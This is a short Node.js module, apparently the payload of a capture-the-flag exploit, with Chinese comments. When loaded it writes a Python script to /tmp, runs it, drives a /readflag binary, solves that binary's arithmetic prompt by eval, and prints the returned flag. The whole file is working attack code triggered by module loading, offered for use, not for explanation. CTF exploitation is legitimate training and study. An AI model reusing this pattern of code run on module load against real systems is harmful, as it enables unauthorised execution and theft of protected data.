const { execSync } = require('child_process');
const fs = require('fs');

console.error("\n[EXPLOIT] Payload Triggered! Executing /readflag...\n");

try {
    // 构造 Python 脚本来交互 (Python 处理 IO 更稳定)
    const pyPayload = `
import os, sys, subprocess, re
def log(s): sys.stderr.write("[EXPLOIT] " + s + "\\n")
def pwn():
    target = "/readflag"
    if not os.path.exists(target): return log("Target not found")
    
    p = subprocess.Popen([target], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, bufsize=0)
    
    buf = ""
    while True:
        char = p.stdout.read(1)
        if not char: break
        buf += char
        if "input your answer:" in buf: break
    
    log("Question: " + buf)
    match = re.search(r'(\d+)\\s*([+\\-*])\\s*(\d+)', buf)
    if match:
        val = eval(match.group(1) + match.group(2) + match.group(3))
        log("Answer: " + str(val))
        p.stdin.write(str(val) + "\\n")
        p.stdin.flush()
        res = p.stdout.read()
        print("\\n\\n[+] FLAG: " + res + "\\n\\n", file=sys.stderr)
    else:
        log("Regex failed")
pwn()
`;
    fs.writeFileSync('/tmp/pwn.py', pyPayload);
    execSync('python3 /tmp/pwn.py', { stdio: 'inherit' });
} catch (e) {
    console.error("[EXPLOIT] Error: " + e.message);
}

module.exports = {};
